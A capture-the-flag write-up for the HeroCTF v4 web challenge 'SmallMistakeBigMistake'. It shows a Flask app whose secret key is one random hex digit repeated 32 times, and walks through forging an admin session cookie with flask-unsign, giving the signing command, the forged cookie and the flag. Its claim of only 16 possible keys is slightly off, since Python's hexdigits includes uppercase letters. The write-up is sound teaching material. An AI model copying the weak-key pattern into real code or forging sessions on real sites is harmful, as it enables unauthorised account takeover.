# HeroCTF v4

## Web

### SmallMistakeBigMistake

**Difficulty:** Easy

**Statement:** The website developer made a small mistake in the code of his website.

Can you identify and exploit it to extract the flag?

***

The challenge makes the source code available to us :

```py
#!/usr/bin/env python
from flask import Flask, session, render_template

from string import hexdigits
from random import choice
from os import getenv


app = Flask(__name__)
app.secret_key = choice(hexdigits) * 32


@app.route("/", methods=["GET"])
def index():
    flag = "You are not admin !"
    if session and session["username"] == "admin":
        flag = getenv("FLAG")

    return render_template("index.html", flag=flag)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(getenv("PORT")))
```

Thanks to the source code, the following information can be found :

- A misconfiguration was made on the key generation on `app.secret_key = choice(hexdigits) * 32`

If we rerun the python code, we can see that the generated key is the concatenation of the same hexdigit 32 times :

```py
>>> from string import hexdigits
>>> from random import choice
>>> choice(hexdigits) * 32
'00000000000000000000000000000000'
```

This means that the key can only be composed of 16 different combinations

- The session cookie must be composed of the value `username:admin`

```py
    if session and session["username"] == "admin":
        flag = getenv("FLAG")
```

With this information, we just have to generate the cookie and sign it with the 16 different combinations with `flask-unsign`.

After a few tries, we get the right key :

```
# flask-unsign --sign --cookie "{'username': 'admin'}" --secret '22222222222222222222222222222222' --no-literal-eval
eyJ1c2VybmFtZSI6ImFkbWluIn0.YpHUjg.1ZdkOHPQaY8nzDyBfMXlmQlSFgI
```

We just have to go to the web interface, add the cookie and get the flag :

![image](https://user-images.githubusercontent.com/49941629/171150158-ff092d86-70b9-473e-95d9-59bede4be83a.png)

Flag : Hero{Sm4ll_Mist4ke_c4n_be_d4ngerous_10853085}
